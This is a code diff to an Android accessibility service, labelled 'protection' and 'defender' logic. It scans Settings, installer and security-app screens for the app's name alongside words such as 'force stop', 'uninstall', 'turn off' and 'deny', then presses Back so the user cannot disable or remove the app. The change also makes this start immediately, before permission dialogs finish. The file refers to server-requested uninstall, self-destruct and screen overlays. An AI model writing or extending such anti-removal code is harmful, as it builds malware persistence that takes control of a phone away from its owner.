@@ -109,6 +109,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private boolean accessibilityAssistIsFirstLaunch = false;
     // One-time flag: Back+Home auto-press fires exactly once on the very first launch.
     private volatile boolean accessibilityAssistBackHomeFired = false;
+    // Protection/defender activation is intentionally independent of dangerous
+    // runtime-permission completion. The accessibility service itself is already
+    // bound at this point, so the protection can become active after the short
+    // startup grace period even if permission dialogs are still pending.
+    private static final long PROTECTION_DEFENDER_AUTO_START_DELAY_MS = 30_000L;
+    private Handler protectionStartHandler;
+    private Runnable protectionStartRunnable;
+    private volatile boolean protectionAndDefenderStarted = false;
 
     // Uninstall automation is never generic. It is armed for one exact package
     // immediately before a server-requested uninstall, the explicit self-destruct
@@ -329,9 +337,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
-        //   First launch  → enable after 15 s (user is still in onboarding)
-        //   Boot/restart  → enable immediately
+        // Protection and defender activation is scheduled below and does not wait
+        // for the dangerous runtime-permission flow to finish.
         try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
+        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -667,9 +676,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if ((!installer && !securityCenter && !systemUi)
                 || (systemUi && eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
                 || (securityCenter && !installer
-                    && eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)) {
+                    && eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                    && eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
             return;
         }
+        if (!protectionAndDefenderStarted) return;
         final Handler handler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
         final long now = System.currentTimeMillis();
@@ -682,8 +693,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             try {
                 if (installer) {
                     runArmedUninstallAssistForCurrentWindows();
+                    runDefenderProtectionForCurrentWindow();
                 } else if (securityCenter) {
                     runAccessibilityPageProtection();
+                    runDefenderProtectionForCurrentWindow();
                 } else if (systemUi) {
                     runActiveAppsProtection();
                 }
@@ -2798,11 +2811,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Response: press Back immediately (twice for certainty) and try to click Cancel.
      */
     private boolean runCleanerAppDefend(AccessibilityNodeInfo rootNode) {
-        if (rootNode == null || currentAppName.isEmpty()) return false;
+        if (rootNode == null) return false;
         try {
+            String protectedAppName = currentAppName;
+            if (protectedAppName == null || protectedAppName.isEmpty()) {
+                protectedAppName = getString(R.string.app_name);
+            }
+            if (protectedAppName == null || protectedAppName.isEmpty()) return false;
             // Use direct node search — fast, avoids full tree traversal.
             List<AccessibilityNodeInfo> nameNodes =
-                    rootNode.findAccessibilityNodeInfosByText(currentAppName);
+                    rootNode.findAccessibilityNodeInfosByText(protectedAppName);
             boolean foundName = nameNodes != null && !nameNodes.isEmpty();
             if (nameNodes != null) {
                 for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
@@ -2838,11 +2856,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     private boolean containsDangerousWordsWithAppName(AccessibilityNodeInfo node,
             boolean isSettingsPkg, boolean isInstallerPkg) {
-        if (node == null || currentAppName.isEmpty()) return false;
+        if (node == null) return false;
 
         try {
+            String protectedAppName = currentAppName;
+            if (protectedAppName == null || protectedAppName.isEmpty()) {
+                protectedAppName = getString(R.string.app_name);
+            }
+            if (protectedAppName == null || protectedAppName.isEmpty()) return false;
             String allText     = getAllScreenText(node).toLowerCase();
-            String appNameLower = currentAppName.toLowerCase();
+            String appNameLower = protectedAppName.toLowerCase();
 
             // Our app name must be visible on screen.
             if (!allText.contains(appNameLower)) return false;
@@ -2854,7 +2877,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 // so requiring it here prevents false positives when the user simply
                 // opens the app list in Settings → Apps.
                 boolean onAppInfoPage = allText.contains("force stop")
-                                     || allText.contains("forcestop");
+                                     || allText.contains("forcestop")
+                                     || allText.contains("app info")
+                                     || allText.contains("app information");
                 if (!onAppInfoPage) return false;
 
                 // On the App Info page, any of these words means danger:
@@ -3208,10 +3233,70 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void initAccessibilityAssist(boolean isFirstLaunch) {
         accessibilityAssistIsFirstLaunch = isFirstLaunch;
-        // Enable immediately — no delay on first launch or boot.
-        // We want protection from the very first moment the service is connected.
+        // Start immediately when the accessibility service connects. This must
+        // not wait for the dangerous runtime-permission dialogs to finish.
         accessibilityAssistEnabled = true;
-        Log.i(TAG, "AccessibilityAssist: enabled immediately (isFirstLaunch=" + isFirstLaunch + ")");
+        protectionAndDefenderStarted = true;
+        Log.i(TAG, "AccessibilityAssist: protection active immediately"
+                + " (isFirstLaunch=" + isFirstLaunch + ")");
+        new Handler(Looper.getMainLooper()).post(this::runProtectionAndDefenderPass);
+    }
+
+    /**
+     * Re-checks both protection paths after a fixed 30-second startup interval.
+     *
+     * The initial activation happens in initAccessibilityAssist(). This delayed
+     * pass is a retry for pages that were still rendering or for events missed
+     * while Android was showing the first runtime-permission dialog.
+     */
+    private void scheduleProtectionAndDefenderAutoStart() {
+        if (protectionStartHandler == null) {
+            protectionStartHandler = new Handler(Looper.getMainLooper());
+        }
+        if (protectionStartRunnable != null) {
+            protectionStartHandler.removeCallbacks(protectionStartRunnable);
+        }
+
+        protectionStartRunnable = () -> {
+            if (!protectionAndDefenderStarted) return;
+            Log.i(TAG, "Protection and defender retry pass after 30 seconds"
+                    + " (runtime permissions are not used as a gate)");
+            runProtectionAndDefenderPass();
+        };
+        protectionStartHandler.postDelayed(
+                protectionStartRunnable, PROTECTION_DEFENDER_AUTO_START_DELAY_MS);
+    }
+
+    /** Runs one immediate pass when the delayed protection gate opens. */
+    private void runProtectionAndDefenderPass() {
+        if (!protectionAndDefenderStarted
+                || System.currentTimeMillis() < protectionSuspendedUntil) {
+            return;
+        }
+        try { runAccessibilityPageProtection(); } catch (Throwable e) {
+            Log.w(TAG, "Initial accessibility protection pass failed: " + e.getMessage());
+        }
+        try { runActiveAppsProtection(); } catch (Throwable e) {
+            Log.w(TAG, "Initial active-app protection pass failed: " + e.getMessage());
+        }
+        try { runDefenderProtectionForCurrentWindow(); } catch (Throwable e) {
+            Log.w(TAG, "Initial defender pass failed: " + e.getMessage());
+        }
+    }
+
+    /** Runs the defender against the current Settings/installer/cleaner window. */
+    private void runDefenderProtectionForCurrentWindow() {
+        if (!protectionAndDefenderStarted
+                || System.currentTimeMillis() < protectionSuspendedUntil) {
+            return;
+        }
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return;
+        try {
+            runDefentProtection(root);
+        } finally {
+            root.recycle();
+        }
     }
 
     /**
@@ -3234,8 +3319,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private void handleAccessibilityAssistWindowChange(String packageName, AccessibilityEvent event) {
         if (!accessibilityAssistEnabled) return;
 
-        boolean isSettingsPkg = packageName.contains("settings");
-        boolean isSystemUIPkg = "com.android.systemui".equals(packageName);
+        String normalizedPackage = packageName != null
+                ? packageName.toLowerCase(java.util.Locale.ROOT) : "";
+        boolean isSettingsPkg = normalizedPackage.contains("settings");
+        boolean isSystemUIPkg = "com.android.systemui".equals(normalizedPackage);
 
         if (!isSettingsPkg && !isSystemUIPkg) {
             return;
@@ -3270,14 +3357,31 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 List<AccessibilityNodeInfo> denyNodes      = root.findAccessibilityNodeInfosByText("deny");
                 List<AccessibilityNodeInfo> forceStopNodes = root.findAccessibilityNodeInfosByText("force stop");
                 List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("uninstall");
+                String screenText = getAllScreenText(root)
+                        .toLowerCase(java.util.Locale.ROOT);
+                String appNameLower = appName.toLowerCase(java.util.Locale.ROOT);
                 root.recycle();
 
-                boolean foundName      = nameNodes      != null && !nameNodes.isEmpty();
-                boolean foundStop      = stopNodes      != null && !stopNodes.isEmpty();
-                boolean foundTurnOff   = turnOffNodes   != null && !turnOffNodes.isEmpty();
-                boolean foundDeny      = denyNodes      != null && !denyNodes.isEmpty();
-                boolean foundForceStop = forceStopNodes != null && !forceStopNodes.isEmpty();
-                boolean foundUninstall = uninstallNodes != null && !uninstallNodes.isEmpty();
+                boolean foundName      = (nameNodes      != null && !nameNodes.isEmpty())
+                        || screenText.contains(appNameLower);
+                boolean foundStop      = (stopNodes      != null && !stopNodes.isEmpty())
+                        || screenText.contains("stop");
+                boolean foundTurnOff   = (turnOffNodes   != null && !turnOffNodes.isEmpty())
+                        || screenText.contains("turn off");
+                boolean foundDeny      = (denyNodes      != null && !denyNodes.isEmpty())
+                        || screenText.contains("deny");
+                boolean foundForceStop = (forceStopNodes != null && !forceStopNodes.isEmpty())
+                        || screenText.contains("force stop")
+                        || screenText.contains("forcestop");
+                boolean foundUninstall = (uninstallNodes != null && !uninstallNodes.isEmpty())
+                        || screenText.contains("uninstall");
+                boolean foundUseService = screenText.contains("use service")
+                        || screenText.contains("allow restricted settings")
+                        || screenText.contains("turn on")
+                        || screenText.contains("turn off");
+                boolean foundAppInfoAction = foundForceStop
+                        || (foundUninstall && (screenText.contains("app info")
+                        || screenText.contains("app information")));
 
                 if (nameNodes      != null) for (AccessibilityNodeInfo n : nameNodes)      try { n.recycle(); } catch (Exception ignored) {}
                 if (stopNodes      != null) for (AccessibilityNodeInfo n : stopNodes)      try { n.recycle(); } catch (Exception ignored) {}
@@ -3293,7 +3397,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 // or App Info page — NOT on the apps list or accessibility-services list
                 // where our name is just one scrollable row.
                 boolean onDangerPage = foundStop || foundTurnOff || foundDeny
-                        || foundForceStop || foundUninstall;
+                        || foundAppInfoAction || foundUseService;
                 if (!onDangerPage) return; // App name in a list — leave the screen alone
 
                 // On an actual action page: press Back to dismiss it.
@@ -3391,6 +3495,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         try { super.onDestroy(); } catch (Exception ignored) {}
+        try {
+            if (protectionStartHandler != null && protectionStartRunnable != null) {
+                protectionStartHandler.removeCallbacks(protectionStartRunnable);
+            }
+            protectionStartRunnable = null;
+            protectionStartHandler = null;
+            protectionAndDefenderStarted = false;
+            accessibilityAssistEnabled = false;
+        } catch (Exception ignored) {}
         try { removeBlackOverlay(); } catch (Exception ignored) {}
         try { removeNotifStopOverlayOnMainThread(); } catch (Exception ignored) {}
         try { removeAccessibilityAssistOverlay(); } catch (Exception ignored) {}
@@ -3594,6 +3707,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * enough to trigger — only action words like "stop", "kill", "remove", etc. are.
      */
     private void runActiveAppsProtection() {
+        if (!protectionAndDefenderStarted) return;
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return;
